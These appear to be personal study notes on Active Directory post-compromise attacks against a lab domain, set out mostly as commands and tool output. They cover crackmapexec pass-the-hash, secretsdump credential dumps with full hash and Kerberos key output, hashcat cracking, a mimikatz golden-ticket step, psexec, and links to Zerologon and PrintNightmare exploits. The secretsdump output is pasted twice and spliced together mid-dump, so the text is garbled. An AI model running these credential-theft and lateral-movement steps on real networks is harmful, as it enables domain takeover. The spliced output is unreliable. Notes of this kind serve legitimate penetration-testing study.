

# pass the password/hash

if we get a hash/password cracked we can pass it around
crackmapexec

metaspoit:
dumphashes 
secretsdump.py

crackmapexec can also dump hashes and enumerate shares

```
crackmapexec smb 10.0.2.0/24 -u 2B -d nier.local -p Password1 

crackmapexec smb 10.0.2.0/24 -u administrator -H <hash> --local-auth
--sam = will dump the sam
--shares
--lsa
crackmapexec smb -L (list all modules)
-M lsassy

cmedb - database of crackmapexec


```
![[Pasted image 20240729113858.png]]

![[Pasted image 20240729113955.png]]
![[Pasted image 20240729114247.png]]

# dumping and cracking hashes

```
secretsdump.py nier.local/2B:'Password1'@10.0.2.15
```

```
secretsdump.py nier.local/administrator:'P@$$w0rd!'@10.0.2.15
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x00bf5104ed7ec5b0677484772383ee49
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction failed: string index out of range
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
NIER\YORHA$:aes256-cts-hmac-sha1-96:ed997a49dafe36deb113d7e1d7aec6dd2929023c8f6bbaacf1006157993f075e
NIER\YORHA$:aes128-cts-hmac-sha1-96:040f69440fb7d061b78beab20a76b615
NIER\YORHA$:des-cbc-md5:6e75a797c44c1fc8
NIER\YORHA$:aad3b435b51404eeaad3b435b51404ee:759be52c8f2a3b09261ff5b36ef79bf7:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xae458c5807850e0ed1e7a0205b4dae4890e4a455
dpapi_userkey:0x29802a4fcf0a11f65e48b55cf13787af6da73a50
[*] NL$KM 
 0000   20 4F F3 D7 06 08 7D 75  53 58 8E 95 38 3A A5 32    O....}uSX..8:.2
 0010   62 94 AB D3 30 E0 9F 9E  CC BE 33 CB 2A 3A 07 44   b...0.....3.*:.D
 0020   F9 AA EC 56 F2 B6 DC 7F  D7 D5 0B 41 B1 3B 31 13   ...V.......A.;1.
 0030   CD 1C B2 A1 AA 2B 5C 6A  65 1B 3F 08 5C 8A 37 10   .....+\je.?.\.7.
NL$KM:204ff3d706087d7553588e95383aa5326294abd330e09f9eccbe33cb2a3a0744f9aaec56f2b6dc7fd7d50b41b13b3113cd1cb2a1aa2b5c6a651b3f085c8a3710
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d44ee81fbc576015a6f2a4292a643c7d:::
nier.local\pascal:1103:aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca:::
nier.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
nier.local\2B:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
nier.local\A2:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
jvLEZAjHBH:1109:aad3b435b51404eeaad3b435b51404ee:846f63cd308c9dd66c83992e95ac1494:::
HsdMnoIjAc:1110:aad3b435b51404eeaad3b435b51404ee:92f80602011c71b694baa9f4a9f45ee4:::
ffzVEKKLCn:1111:aad3b435b51404eeaad3b435b51404ee:5394eb4e209482ca7629ab9aa5657bcd:::
lglVsZWget:1112:aad3b435b51404eeaad3b435b51404ee:7e6f7b81bf60513f69919fefbdadd2ff:::
YORHA$:1000:aad3b435b51404eeaad3b435b51404ee:759be52c8f2a3b09261ff5b36ef79bf7:::
THEPUNISHER$:1107:aad3b435b51404eeaad3b435b51404ee:c7b0c0ca14c58f7af5d81e488c886ffd:::
THEBUNKER$:1108:aad3b435b51404eeaad3b435b51404ee:8a23b0091b5151d30569b5916125f89d:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:1cacdf1384b0b07043a7d107c8a27355add2229e1f9845d25c7ba863bd35c794
Administrator:aes128-cts-hmac-sha1-96:f9d3cbb98f5ba3469dfa416429a879c8
Administrator:des-cbc-md5:16e994ce94291562
krbtgt:aes256-cts-hmac-sha1-96:9255867447abc655441bd3fc82833590456ff576bf59128de7fe8300f5d0ecf3
krbtgt:aes128-cts-hmac-sha1-96:82f127f166a206b4f51dac80198e9049
krbtgt:des-cbc-md5:97f7abd691ceaed9
nier.local\pascal:aes256-cts-hmac-sha1-96:53191bb392464e11704212fd2e94d5cc42ef37181c9f9fb9c47df03f1d2c7c0d
nier.local\pascal:aes128-cts-hmac-sha1-96:750c34522d353c05e6e7b8206501ee79
nier.local\pascal:des-cbc-md5:f8402902bfb36464
nier.local\SQLService:aes256-cts-hmac-sha1-96:464caf72b06c25672df482a882a2538a998a7eb5d7afd877f24543516599679e
nier.local\SQLService:aes128-cts-hmac-sha1-96:613431bef27bf5412f381fb3f1757f37
nier.local\SQLService:des-cbc-md5:e98cb0297383a170
nier.local\2B:aes256-cts-hmac-sha1-96:18ad7c751579daa5b4ae70a727b852868f078392d79a8a7767f1cada33f8ce7b
nier.local\2B:aes128-cts-hmac-sha1-96:11b0165f1688a22d47fe31ffb3536b17
nier.local\2B:des-cbc-md5:a86dd0a4fb5e4f13
nier.local\A2:aes256-cts-hmac-sha1-96:0cd8058e09c4b769809fff68b1e86d056eaaccd9f3618fa51d70a900368cffcf
nier.local\A2:aes128-cts-hmac-sha1-96:cb9dc8543b081da89f2b4b5eea1c2a5e
nier.local\A2:des-cbc-md5:3b37d0d573077526
jvLEZAjHBH:aes256-cts-hmac-sha1-96:6f3028597f7732408df227b9efe9440922cdff12340a7bf75a6b4a576a8e2ac3
jvLEZAjHBH:aes128-cts-hmac-sha1-96:5b32b797ed42f7d1da89a13f0b7b060f
jvLEZAjHBH:des-cbc-md5:ce6bb9a13ec4cbd5
HsdMnoIjAc:aes256-cts-hmac-sha1-96:577378b46dfae211e3eef43c8ffe3198f26c8c9629ea897f8688fbb43aaf97a3
HsdMnoIjAc:aes128-cts-hmac-sha1-96:f14710c0e1a369cbce9365c60041d396
HsdMnoIjAc:des-cbc-md5:d6517ab6a10d790e
ffzVEKKLCn:aes256-cts-hmac-sha1-96:4568a15174a8be318c4969a316ade5b1b23149d29f252fca80a0dffd44c04d51
ffzVEKKLCn:aes128-cts-hmac-sha1-96:8636e1b8a8cd60d7b18ff747d985d058
ffzVEKKLCn:des-cbc-md5:5e68f76e831aa2a7
lglVsZWget:aes256-cts-hmac-sha1-96:6b4adb87b8c4f0c120fe93d94dcbaf6254afccaf40ed615ab6abcde86b6f55d2
lglVsZWget:aes128-cts-hmac-sha1-96:596c1ae1846192469fe58c27c9474b50
lglVsZWget:des-cbc-md5:2052bf5892324a8f
YORHA$:aes256-cts-hmac-sha1-96:ed997a49dafe36deb113d7e1d7aec6dd2929023c8f6bbaacf1006157993f075e
YORHA$:aes128-cts-hmac-sha1-96:040f69440fb7d061b78beab20a76b615
YORHA$:des-cbc-md5:8a9b7f5749a7d515
THEPUNISHER$:aes256-cts-hmac-sha1-96:672414e9c533df3e90d6c6099e40e01da9df356583ecd03f9ec27a540b2580ef
THEPUNISHER$:aes128-cts-hmac-sha1-96:a100fcb530fcd3450e9e089546e53eff
THEPUNISHER$:des-cbc-md5:04e57a08ce49d5f7
THEBUNKER$:aes256-cts-hmac-sha1-96:4f9584571723e581ff80ec49a9045a7c0fbfab0a54da9bb8424fe08da6b0cdd8
THEBUNKER$:aes128-cts-hmac-sha1-96:27dd56061e0562f6bdde1cc8ff60ea04
THEBUNKER$:des-cbc-md5:ec075b9d6d02e949
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

```

older systems use wdigest which stores passwords as clear text.
you can also force wdigest on 

you can also pass a hash with secretsdump with -hashes 

use the NT part of the hash to crack with it hashcat (LM:NT)

# mitigation

limit account re use 
utilize strong passwords
privilage access management 

# [[Kerberoasting and other stuff]]

# attack stratergy 

kerberoasting 
secretsdump
pass the hash/password

not possible?
dig deeper
enumerate (bloodhound)
old vulnerabilities 

think outside the box

certificate attack



# post compromise 

do it again, try to find other paths/vulnerabilities 

dump NTDS.dit and try to crack the passwords

Persistence can be important 

enumerate shares for sensitive info


# NTDS.dit 

database used to store AD data:
user/group info
security descriptor
password hashes 

```
secretsdump.py nier.local/engels:'Password1@'@10.0.2.15
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x00bf5104ed7ec5b0677484772383ee49
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction failed: string index out of range
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
NIER\YORHA$:aes256-cts-hmac-sha1-96:ed997a49dafe36deb113d7e1d7aec6dd2929023c8f6bbaacf1006157993f075e
NIER\YORHA$:aes128-cts-hmac-sha1-96:040f69440fb7d061b78beab20a76b615
NIER\YORHA$:des-cbc-md5:6e75a797c44c1fc8
NIER\YORHA$:aad3b435b51404eeaad3b435b51404ee:759be52c8f2a3b09261ff5b36ef79bf7:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xae458c5807850e0ed1e7a0205b4dae4890e4a455
dpapi_userkey:0x29802a4fcf0a11f65e48b55cf13787af6da73a50
[*] NL$KM 
 0000   20 4F F3 D7 06 08 7D 75  53 58 8E 95 38 3A A5 32    O....}uSX..8:.2
 0010   62 94 AB D3 30 E0 9F 9E  CC BE 33 CB 2A 3A 07 44   b...0.....3.*:.D
 0020   F9 AA EC 56 F2 B6 DC 7F  D7 D5 0B 41 B1 3B 31 13   ...V.......A.;1.
 0030   CD 1C B2 A1 AA 2B 5C 6A  65 1B 3F 08 5C 8A 37 10   .....+\je.?.\.7.
NL$KM:204ff3d706087d7553588e95383aa5326294abd330e09f9eccbe33cb2a3a0744f9aaec56f2b6dc7fd7d50b41b13b3113cd1cb2a1aa2b5c6a651b3f085c8a3710
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d44ee81fbc576015a6f2a4292a643c7d:::
nier.local\pascal:1103:aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca:::
nier.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
nier.local\2B:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
nier.local\A2:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
jvLEZAjHBH:1109:aad3b435b51404eeaad3b435b51404ee:846f63cd308c9dd66c83992e95ac1494:::
HsdMnoIjAc:1110:aad3b435b51404eeaad3b435b51404ee:92f80602011c71b694baa9f4a9f45ee4:::
ffzVEKKLCn:1111:aad3b435b51404eeaad3b435b51404ee:5394eb4e209482ca7629ab9aa5657bcd:::
lglVsZWget:1112:aad3b435b51404eeaad3b435b51404ee:7e6f7b81bf60513f69919fefbdadd2ff:::
engels:1113:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
YORHA$:1000:aad3b435b51404eeaad3b435b51404ee:759be52c8f2a3b09261ff5b36ef79bf7:::
THEPUNISHER$:1107:aad3b435b51404eeaad3b435b51404ee:c7b0c0ca14c58f7af5d81e488c886ffd:::
THEBUNKER$:1108:aad3b435b51404eeaad3b435b51404ee:8a23b0091b5151d30569b5916125f89d:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:1cacdf1384b0b07043a7d107c8a27355add2229e1f9845d25c7ba863bd35c794
Administrator:aes128-cts-hmac-sha1-96:f9d3cbb98f5ba3469dfa416429a879c8
Administrator:des-cbc-md5:16e994ce94291562
krbtgt:aes256-cts-hmac-sha1-96:9255867447abc655441bd3fc82833590456ff576bf59128de7fe8300f5d0ecf3
krbtgt:aes128-cts-hmac-sha1-96:82f127f166a206b4f51dac80198e9049
krbtgt:des-cbc-md5:97f7abd691ceaed9
nier.local\pascal:aes256-cts-hmac-sha1-96:53191bb392464e11704212fd2e94d5cc42ef37181c9f9fb9c47df03f1d2c7c0d
nier.local\pascal:aes128-cts-hmac-sha1-96:750c34522d353c05e6e7b8206501ee79
nier.local\pascal:des-cbc-md5:f8402902bfb36464
nier.local\SQLService:aes256-cts-hmac-sha1-96:464caf72b06c25672df482a882a2538a998a7eb5d7afd877f24543516599679e
secretsdump.py nier.local/engels:'Password1@'@10.0.2.15
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x00bf5104ed7ec5b0677484772383ee49
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction failed: string index out of range
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
NIER\YORHA$:aes256-cts-hmac-sha1-96:ed997a49dafe36deb113d7e1d7aec6dd2929023c8f6bbaacf1006157993f075e
NIER\YORHA$:aes128-cts-hmac-sha1-96:040f69440fb7d061b78beab20a76b615
NIER\YORHA$:des-cbc-md5:6e75a797c44c1fc8
NIER\YORHA$:aad3b435b51404eeaad3b435b51404ee:759be52c8f2a3b09261ff5b36ef79bf7:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xae458c5807850e0ed1e7a0205b4dae4890e4a455
dpapi_userkey:0x29802a4fcf0a11f65e48b55cf13787af6da73a50
[*] NL$KM 
 0000   20 4F F3 D7 06 08 7D 75  53 58 8E 95 38 3A A5 32    O....}uSX..8:.2
 0010   62 94 AB D3 30 E0 9F 9E  CC BE 33 CB 2A 3A 07 44   b...0.....3.*:.D
 0020   F9 AA EC 56 F2 B6 DC 7F  D7 D5 0B 41 B1 3B 31 13   ...V.......A.;1.
 0030   CD 1C B2 A1 AA 2B 5C 6A  65 1B 3F 08 5C 8A 37 10   .....+\je.?.\.7.
NL$KM:204ff3d706087d7553588e95383aa5326294abd330e09f9eccbe33cb2a3a0744f9aaec56f2b6dc7fd7d50b41b13b3113cd1cb2a1aa2b5c6a651b3f085c8a3710
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d44ee81fbc576015a6f2a4292a643c7d:::
nier.local\pascal:1103:aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca:::
nier.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
nier.local\2B:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
nier.local\A2:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
jvLEZAjHBH:1109:aad3b435b51404eeaad3b435b51404ee:846f63cd308c9dd66c83992e95ac1494:::
HsdMnoIjAc:1110:aad3b435b51404eeaad3b435b51404ee:92f80602011c71b694baa9f4a9f45ee4:::
ffzVEKKLCn:1111:aad3b435b51404eeaad3b435b51404ee:5394eb4e209482ca7629ab9aa5657bcd:::
lglVsZWget:1112:aad3b435b51404eeaad3b435b51404ee:7e6f7b81bf60513f69919fefbdadd2ff:::
engels:1113:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
YORHA$:1000:aad3b435b51404eeaad3b435b51404ee:759be52c8f2a3b09261ff5b36ef79bf7:::
THEPUNISHER$:1107:aad3b435b51404eeaad3b435b51404ee:c7b0c0ca14c58f7af5d81e488c886ffd:::
THEBUNKER$:1108:aad3b435b51404eeaad3b435b51404ee:8a23b0091b5151d30569b5916125f89d:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:1cacdf1384b0b07043a7d107c8a27355add2229e1f9845d25c7ba863bd35c794
Administrator:aes128-cts-hmac-sha1-96:f9d3cbb98f5ba3469dfa416429a879c8
Administrator:des-cbc-md5:16e994ce94291562
krbtgt:aes256-cts-hmac-sha1-96:9255867447abc655441bd3fc82833590456ff576bf59128de7fe8300f5d0ecf3
krbtgt:aes128-cts-hmac-sha1-96:82f127f166a206b4f51dac80198e9049
krbtgt:des-cbc-md5:97f7abd691ceaed9
nier.local\pascal:aes256-cts-hmac-sha1-96:53191bb392464e11704212fd2e94d5cc42ef37181c9f9fb9c47df03f1d2c7c0d
nier.local\pascal:aes128-cts-hmac-sha1-96:750c34522d353c05e6e7b8206501ee79
nier.local\pascal:des-cbc-md5:f8402902bfb36464
nier.local\SQLService:aes256-cts-hmac-sha1-96:464caf72b06c25672df482a882a2538a998a7eb5d7afd877f24543516599679e
nier.local\SQLService:aes128-cts-hmac-sha1-96:613431bef27bf5412f381fb3f1757f37
nier.local\SQLService:des-cbc-md5:e98cb0297383a170
nier.local\2B:aes256-cts-hmac-sha1-96:18ad7c751579daa5b4ae70a727b852868f078392d79a8a7767f1cada33f8ce7b
nier.local\2B:aes128-cts-hmac-sha1-96:11b0165f1688a22d47fe31ffb3536b17
nier.local\2B:des-cbc-md5:a86dd0a4fb5e4f13
nier.local\A2:aes256-cts-hmac-sha1-96:0cd8058e09c4b769809fff68b1e86d056eaaccd9f3618fa51d70a900368cffcf
nier.local\A2:aes128-cts-hmac-sha1-96:cb9dc8543b081da89f2b4b5eea1c2a5e
nier.local\A2:des-cbc-md5:3b37d0d573077526
jvLEZAjHBH:aes256-cts-hmac-sha1-96:6f3028597f7732408df227b9efe9440922cdff12340a7bf75a6b4a576a8e2ac3
jvLEZAjHBH:aes128-cts-hmac-sha1-96:5b32b797ed42f7d1da89a13f0b7b060f
jvLEZAjHBH:des-cbc-md5:ce6bb9a13ec4cbd5
HsdMnoIjAc:aes256-cts-hmac-sha1-96:577378b46dfae211e3eef43c8ffe3198f26c8c9629ea897f8688fbb43aaf97a3
HsdMnoIjAc:aes128-cts-hmac-sha1-96:f14710c0e1a369cbce9365c60041d396
HsdMnoIjAc:des-cbc-md5:d6517ab6a10d790e
ffzVEKKLCn:aes256-cts-hmac-sha1-96:4568a15174a8be318c4969a316ade5b1b23149d29f252fca80a0dffd44c04d51
ffzVEKKLCn:aes128-cts-hmac-sha1-96:8636e1b8a8cd60d7b18ff747d985d058
ffzVEKKLCn:des-cbc-md5:5e68f76e831aa2a7
lglVsZWget:aes256-cts-hmac-sha1-96:6b4adb87b8c4f0c120fe93d94dcbaf6254afccaf40ed615ab6abcde86b6f55d2
lglVsZWget:aes128-cts-hmac-sha1-96:596c1ae1846192469fe58c27c9474b50
lglVsZWget:des-cbc-md5:2052bf5892324a8f
engels:aes256-cts-hmac-sha1-96:d332a4d8be1545c07082ae5dd5303e5221c1ca817902ada6c5cc53d734d4ba63
engels:aes128-cts-hmac-sha1-96:f0bcf8f479e2d63127fe7e5338c80446
engels:des-cbc-md5:d638c151917aa273
YORHA$:aes256-cts-hmac-sha1-96:ed997a49dafe36deb113d7e1d7aec6dd2929023c8f6bbaacf1006157993f075e
YORHA$:aes128-cts-hmac-sha1-96:040f69440fb7d061b78beab20a76b615
YORHA$:des-cbc-md5:8a9b7f5749a7d515
THEPUNISHER$:aes256-cts-hmac-sha1-96:672414e9c533df3e90d6c6099e40e01da9df356583ecd03f9ec27a540b2580ef
THEPUNISHER$:aes128-cts-hmac-sha1-96:a100fcb530fcd3450e9e089546e53eff
THEPUNISHER$:des-cbc-md5:04e57a08ce49d5f7
THEBUNKER$:aes256-cts-hmac-sha1-96:4f9584571723e581ff80ec49a9045a7c0fbfab0a54da9bb8424fe08da6b0cdd8
THEBUNKER$:aes128-cts-hmac-sha1-96:27dd56061e0562f6bdde1cc8ff60ea04
THEBUNKER$:des-cbc-md5:ec075b9d6d02e949
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
nier.local\SQLService:aes128-cts-hmac-sha1-96:613431bef27bf5412f381fb3f1757f37
nier.local\SQLService:des-cbc-md5:e98cb0297383a170
nier.local\2B:aes256-cts-hmac-sha1-96:18ad7c751579daa5b4ae70a727b852868f078392d79a8a7767f1cada33f8ce7b
nier.local\2B:aes128-cts-hmac-sha1-96:11b0165f1688a22d47fe31ffb3536b17
nier.local\2B:des-cbc-md5:a86dd0a4fb5e4f13
nier.local\A2:aes256-cts-hmac-sha1-96:0cd8058e09c4b769809fff68b1e86d056eaaccd9f3618fa51d70a900368cffcf
nier.local\A2:aes128-cts-hmac-sha1-96:cb9dc8543b081da89f2b4b5eea1c2a5e
nier.local\A2:des-cbc-md5:3b37d0d573077526
jvLEZAjHBH:aes256-cts-hmac-sha1-96:6f3028597f7732408df227b9efe9440922cdff12340a7bf75a6b4a576a8e2ac3
jvLEZAjHBH:aes128-cts-hmac-sha1-96:5b32b797ed42f7d1da89a13f0b7b060f
jvLEZAjHBH:des-cbc-md5:ce6bb9a13ec4cbd5
HsdMnoIjAc:aes256-cts-hmac-sha1-96:577378b46dfae211e3eef43c8ffe3198f26c8c9629ea897f8688fbb43aaf97a3
HsdMnoIjAc:aes128-cts-hmac-sha1-96:f14710c0e1a369cbce9365c60041d396
HsdMnoIjAc:des-cbc-md5:d6517ab6a10d790e
ffzVEKKLCn:aes256-cts-hmac-sha1-96:4568a15174a8be318c4969a316ade5b1b23149d29f252fca80a0dffd44c04d51
ffzVEKKLCn:aes128-cts-hmac-sha1-96:8636e1b8a8cd60d7b18ff747d985d058
ffzVEKKLCn:des-cbc-md5:5e68f76e831aa2a7
lglVsZWget:aes256-cts-hmac-sha1-96:6b4adb87b8c4f0c120fe93d94dcbaf6254afccaf40ed615ab6abcde86b6f55d2
lglVsZWget:aes128-cts-hmac-sha1-96:596c1ae1846192469fe58c27c9474b50
lglVsZWget:des-cbc-md5:2052bf5892324a8f
engels:aes256-cts-hmac-sha1-96:d332a4d8be1545c07082ae5dd5303e5221c1ca817902ada6c5cc53d734d4ba63
engels:aes128-cts-hmac-sha1-96:f0bcf8f479e2d63127fe7e5338c80446
engels:des-cbc-md5:d638c151917aa273
YORHA$:aes256-cts-hmac-sha1-96:ed997a49dafe36deb113d7e1d7aec6dd2929023c8f6bbaacf1006157993f075e
YORHA$:aes128-cts-hmac-sha1-96:040f69440fb7d061b78beab20a76b615
YORHA$:des-cbc-md5:8a9b7f5749a7d515
THEPUNISHER$:aes256-cts-hmac-sha1-96:672414e9c533df3e90d6c6099e40e01da9df356583ecd03f9ec27a540b2580ef
THEPUNISHER$:aes128-cts-hmac-sha1-96:a100fcb530fcd3450e9e089546e53eff
THEPUNISHER$:des-cbc-md5:04e57a08ce49d5f7
THEBUNKER$:aes256-cts-hmac-sha1-96:4f9584571723e581ff80ec49a9045a7c0fbfab0a54da9bb8424fe08da6b0cdd8
THEBUNKER$:aes128-cts-hmac-sha1-96:27dd56061e0562f6bdde1cc8ff60ea04
THEBUNKER$:des-cbc-md5:ec075b9d6d02e949
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

```

![[Pasted image 20240730115223.png]]

```
cut --delimiter=':' -f 4 hashes_full

hashcat -m 1000 hashes /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20240730120214.png]]
dont crack pc passwords

![[Pasted image 20240730120659.png]]

# golden ticket attack

on the windows server

```
mimikatz.exe

privilege::debug

lsadump:lsa /inject /name:krbtgt
```

![[Pasted image 20240730153953.png]]

![[Pasted image 20240730154334.png]]


![[Pasted image 20240730154556.png]]

download psexec on windows 

```
psexec.exe \\ThePunisher cmd.exe
```

look into silver tickets
![[Pasted image 20240730155053.png]]


# recent vulnerabilties
# zerologon 

basically setting the authentication password to NULL to gain access
https://www.trendmicro.com/en_us/what-is/zerologon.html


# printnightmare

https://github.com/cube0x0/CVE-2021-1675

https://github.com/calebstewart/CVE-2021-1675

# case studies 

https://tcm-sec.com/pentest-tales-001-you-spent-how-much-on-security/

https://tcm-sec.com/pentest-tales-002-digging-deep

